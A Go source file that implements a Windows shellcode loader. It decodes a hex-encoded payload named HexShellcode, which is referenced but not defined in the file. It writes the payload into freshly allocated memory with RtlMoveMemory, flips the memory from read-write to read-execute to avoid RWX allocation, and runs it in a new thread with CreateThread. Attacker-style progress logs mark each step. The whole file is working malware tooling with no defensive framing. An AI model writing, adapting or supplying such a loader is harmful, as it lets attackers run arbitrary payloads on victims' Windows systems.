package main

import (
	"encoding/hex"
	"log"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

func main() {
	shellAddr, shellSrc := AllocateShellcode()

	CopyShellcodeToMemory(&shellAddr, &shellSrc)

	ChangeShellcodeMemoryToRX(&shellAddr, len(shellSrc))

	tHandle := CreateThread(&shellAddr)

	RunShellcode(&tHandle)
}

func AllocateShellcode() (uintptr, []byte) {
	shellCodeSrc, _ := hex.DecodeString(HexShellcode)

	shellAddr, err := windows.VirtualAlloc(
		uintptr(0),
		uintptr(len(shellCodeSrc)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		syscall.PAGE_READWRITE)
	// syscall.PAGE_EXECUTE_READWRITE)

	if err != nil {
		// The verb %v ('v' for 'value') always formats the argument in its default form,
		// The special verb %T ('T' for 'Type') prints the type of the argument rather than its value.
		log.Panicf("[-] Shellcode Virtual Memory Allocation  Failed! %v \n", err)
	}

	log.Printf("[+] Allocation Memory Addr Done 0x[%v] \n", shellAddr)
	return shellAddr, shellCodeSrc
}

func CopyShellcodeToMemory(shellcodeAddr *uintptr, shellCodeSrc *[]byte) {
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	procRtlMoveMemory := ntdll.NewProc("RtlMoveMemory")

	procRtlMoveMemory.Call(*shellcodeAddr,
		// 1. Dereference Before Indexing
		// 2. Pointer to First Element
		uintptr(unsafe.Pointer(&(*shellCodeSrc)[0])),
		uintptr(len(*shellCodeSrc)))
	log.Printf("[+] Shellcode Wrote Done 0x[%v] \n", shellcodeAddr)
}

func ChangeShellcodeMemoryToRX(shellcodeAddr *uintptr, shellCodeSrcLen int) {
	log.Printf("[ ] Changing Shellcode Memory Address Permission To R-X \n")
	var oldProtect uint32
	err := windows.VirtualProtect(*shellcodeAddr,
		uintptr(shellCodeSrcLen),
		syscall.PAGE_EXECUTE_READ,
		&oldProtect)
	if err != nil {

		log.Panicf("[-] Change Shellcode Virtual Memory Permission To R-X Failed! %v \n", err)
	}
	log.Printf("[+] Shellcode Memory Permissions Changed To R-X \n")
}

func CreateThread(shellAddr *uintptr) uintptr {
	kernel32dll := syscall.NewLazyDLL("kernel32.dll")
	procCreateThread := kernel32dll.NewProc("CreateThread")

	tHandle, _, lastErr := procCreateThread.Call(
		uintptr(0),
		uintptr(0),
		*shellAddr,
		uintptr(0),
		uintptr(0),
		uintptr(0))

	if tHandle == 0 {
		log.Panicf("[-] Error While Creating Thread %v \n", lastErr)
	}
	log.Printf("[+] Handle Of New Created Thread (%v) \n", tHandle)

	return tHandle
}
func RunShellcode(tHandle *uintptr) {
	log.Printf("[ ] Waiting For Thread To Execute Shellcode...  \n")
	windows.WaitForSingleObject(windows.Handle(*tHandle), 3000)
	// 300 = dwMilliseconds (wait time)
	// Without using WaitForSingleObject, the main program might terminate immediately after the new thread is created
	// and the shellcode might not be fully executed. This function prevents this problem by pausing the main program
	// until the thread completes.
}
